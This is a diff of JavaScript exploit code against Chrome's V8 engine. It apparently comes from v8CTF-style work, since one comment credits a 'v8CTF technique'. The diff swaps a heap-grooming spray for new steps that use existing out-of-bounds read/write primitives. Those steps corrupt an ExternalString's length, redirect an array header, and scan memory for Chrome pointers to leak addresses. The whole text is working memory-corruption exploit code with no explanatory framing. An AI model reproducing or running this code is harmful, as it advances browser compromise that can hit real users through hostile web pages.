@@ -96,24 +96,12 @@ if(Array.isArray(m)){
     const fo=objB[4];
     log("FO:"+(!!fo&&!!fo.exports&&fo.exports.f()===42));
     objB[4]=marker;
-    // ES + NATIVE GROOM (v8CTF technique: densify malloc heap with resource objects)
+    // ES (pre-allocated decode? NO — decode allocates; try anyway, live FA won't stale)
     try{
+      // Allocate ES with 0x200 bytes (bigger → higher address after spray)
       const dec=new TextDecoder("windows-1252");
-      const holder=document.createElement("div");
-      const keep=[];
-      function externalize(size,byte){
-        const bytes=new Uint8Array(size);bytes.fill(byte);
-        const v=dec.decode(bytes);
-        holder.setAttribute("data-x"+keep.length,v);
-        keep.push(v);
-        return v;
-      }
-      // groom 3000 x 0x400 = ~4.8MB native resources with C++ vtables
-      for(let gi=0;gi<3000;gi++){externalize(0x400,0x42+(gi%24));}
-      const eb=new Uint8Array(0x40);eb.fill(0x41);
+      const eb=new Uint8Array(0x200);eb.fill(0x41);
       const es=dec.decode(eb);
-      // one more groom batch AFTER es so resources follow it in memory
-      for(let gi=0;gi<300;gi++){externalize(0x400,0x61+(gi%24));}
       objB[4]=es;
       const esAddr=f2i(m[OB+2])&0xffffffffn;
       objB[4]=marker;
@@ -121,7 +109,7 @@ if(Array.isArray(m)){
       // direct master write to es length qword at obj+8
       const tq=(esAddr-1n)+8n;
       const off=tq-0x1080018n;
-      if(off>0n&&off<0x10000000n){
+      if(off>0n&&off<0x400000n){
         if((off&7n)===0n){
           const idx=Number(off>>3n);
           const v=f2i(m[idx]);
@@ -135,21 +123,55 @@ if(Array.isArray(m)){
         }
         log("NL:"+es.length.toString(16));
         if(es.length===0x01200000){
-          // fine scan: collect qwords, find repeated values (vtable signature)
-          const counts=new Map();
-          let nz=0;
-          for(let off=0x800;off<0x30000;off+=0x200){
-            let q="";
-            for(let j2=0;j2<8;j2++){q+=es.charCodeAt(off+j2).toString(16).padStart(2,"0");}
-            if(q==="0000000000000000")continue;
-            nz++;
-            counts.set(q,(counts.get(q)||0)+1);
+          // Wide scan for Chrome pointers at key offsets
+          const R=[];
+          for(const off of [0x40,0x80,0x100,0x200,0x400,0x600,0x800,0xC00,0x1000,0x1800,0x2000,0x3000,0x4000,0x5000,0x6000,0x7000]){
+            try{
+              let qw=0n;
+              for(let b=0;b<8;b++)qw|=BigInt(es.charCodeAt(off+b))<<BigInt(b*8);
+              if(qw!==0n)R.push(off.toString(16)+":"+qw.toString(16));
+            }catch(e){}
           }
-          // top 6 repeated
-          const top=[...counts.entries()].sort((a,b)=>b[1]-a[1]).slice(0,6);
-          log("NZ:"+nz+" TOP:"+top.map(e=>e[0]+"x"+e[1]).join(","));
+          if(R.length>0)log("R:"+R.slice(0,8).join(","));
+          else log("R:ALL_ZERO");
         }
-      }else{log("OFF_BAD:"+off.toString(16));}
+      }else{
+        // ES below PIN: try self-modify to reach ES
+        log("OFF_NEG:"+off.toString(16));
+        // Use header at LIVE position to redirect master to ES
+        const hdrTgt=0x7fdffffe01080011n;
+        let hk=-1;
+        // Header should be 2 QWORDs before the first marker pair in the LIVE block
+        const liveK=10000; // LIVE@10000
+        for(const dk of [-2,-1,0,1,2]){
+          try{if(f2i(m[liveK+dk])===hdrTgt){hk=liveK+dk;break;}}catch(e){}
+        }
+        if(hk>=0){
+          const newPin=(esAddr-1n)+1n; // elements = esAddr (tagged)
+          m[hk]=i2f((4n<<32n)|newPin); // redirect to ES, length=2(smi)
+          // m[0] now reads ES offset 0 (map+hash), m[1] reads offset 8 (length+resource_lo)
+          const esF0=f2i(m[0]); // map+hash
+          const esF1=f2i(m[1]); // this QWORD contains the length field
+          log("ESF0:"+esF0.toString(16));
+          log("ESF1:"+esF1.toString(16));
+          // The length is at ExternalString offset 8 (on compressed 64-bit):
+          // map(4) + hash(4) → offset 8 = length(4) + [padding or next field]
+          // Write new length
+          const newLen=0x01200000n;
+          m[1]=i2f((esF1&0xffffffff00000000n)|newLen);
+          log("NL:"+es.length.toString(16));
+          if(es.length===0x01200000){
+            const R2=[];
+            for(const o of [0x40,0x100,0x400,0x1000,0x2000]){
+              try{
+                let qw=0n;for(let b=0;b<8;b++)qw|=BigInt(es.charCodeAt(o+b))<<BigInt(b*8);
+                if(qw!==0n)R2.push(o.toString(16)+":"+qw.toString(16));
+              }catch(e){}
+            }
+            log("R2:"+(R2.length?R2.join(","):"ZERO"));
+          }
+        }else{log("NO_HDR_ES");}
+      }
     }catch(e){log("ESE:"+e.message);}
   }
   log("W: "+wasmI.exports.f());
